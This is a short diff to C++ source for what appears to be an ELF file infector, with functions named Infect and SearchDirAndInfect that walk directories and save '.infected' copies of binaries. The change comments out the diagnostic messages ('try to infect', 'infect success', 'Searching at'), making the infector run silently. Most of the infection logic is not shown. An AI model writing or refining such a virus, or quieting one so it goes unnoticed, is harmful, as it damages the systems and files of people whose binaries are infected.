@@ -10,7 +10,7 @@
 
 void Infect(const char *elfName)
 {
-    std::cerr << "try to infect " << elfName << std::endl;
+    // std::cerr << "try to infect " << elfName << std::endl;
 
     using namespace ELFIO;
     elfio elfFile;
@@ -78,12 +78,12 @@ void Infect(const char *elfName)
     free(dynData);
 
     elfFile.save(elfName + std::string(".infected"));
-    std::cout << "\tinfect success" << std::endl;
+    // std::cout << "\tinfect success" << std::endl;
 }
 
 int SearchDirAndInfect(const char *path)
 {
-    std::cerr << "Searching at " << path << std::endl;
+    // std::cerr << "Searching at " << path << std::endl;
 	DIR *dir;
 	struct dirent *ent;
 	if ((dir = opendir(path)) != NULL) {
